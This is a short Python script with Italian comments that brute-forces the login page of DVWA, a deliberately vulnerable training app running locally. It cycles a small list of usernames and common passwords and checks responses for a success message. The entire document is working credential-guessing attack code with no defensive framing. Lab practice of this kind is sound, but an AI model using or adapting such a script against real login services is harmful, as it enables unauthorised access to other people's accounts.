import requests
import time

dvwa_url = "http://127.0.0.1:42001/vulnerabilities/brute/"

username_list = ["admin", "user"]
password_list = ["123456", "admin", "letmain", "password", "password1"]

session_cookie = {"PHPSESSID": "il9kueveb76l5uba0ubvd5tib6", "security": "medium"}

success_string = "Welcome to the password protected area admin"

found = False

for username in username_list:
    for password in password_list:
        # Parametri GET da inviare
        params = {
            "username": username,
            "password": password,
            "Login": "Login"
        }

        # Inizio del tentativo, prendiamo il tempo attuale
        start_time = time.time()

        try:
            response = requests.get(dvwa_url, params=params, cookies=session_cookie, timeout=5)

            # Se la risposta arriva prima del timeout (0,5 secondi), controlla il contenuto
            if time.time() - start_time < 0.5:
                if success_string in response.text:
                    print(f"Accesso riuscito! Username: {username}, Password: {password}")
                    found = True
                    break
                else:
                    print(f"Tentativo fallito - Username: {username}, Password: {password}")
            else:
                print(f"Timeout per Username: {username}. Password: {password} (tempo massimo di 0,5 secondi raggiunto)")

        except requests.exceptions.RequestException as e:
            # Se la richiesta fallisce (timeout o altro), non entriamo nell'eccezione, ma facciamo un cont sul il tempo
            print(f"Errore nella richiesta per Username: {username}. Password: {password} - {e}")

        # Verifichiamo se l'accesso è stato trovato e fermiamo il ciclo esterno
        if found:
            break

    # Verifichiamo se l'accesso è stato trovato e fermiamo il ciclo esterno
    if found:
        break
